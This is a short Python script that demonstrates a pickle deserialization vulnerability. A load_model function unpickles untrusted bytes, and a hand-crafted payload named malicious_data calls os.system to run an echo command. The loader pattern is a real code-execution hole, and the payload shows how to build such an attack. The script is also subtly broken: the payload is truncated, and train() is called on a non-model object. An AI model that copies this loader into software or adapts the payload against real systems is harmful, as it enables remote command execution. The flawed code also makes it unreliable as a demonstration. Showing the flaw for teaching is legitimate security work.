import pickle

class MyModel:
    def __init__(self, model_data):
        self.model_data = model_data

    def train(self):
        print("Training model with data:", self.model_data)

def load_model(serialized_data):
    model = pickle.loads(serialized_data)
    return model

malicious_data = b"cos\nsystem\n(S'echo Vulnerable code executed!'\n)"

model = load_model(malicious_data)
model.train()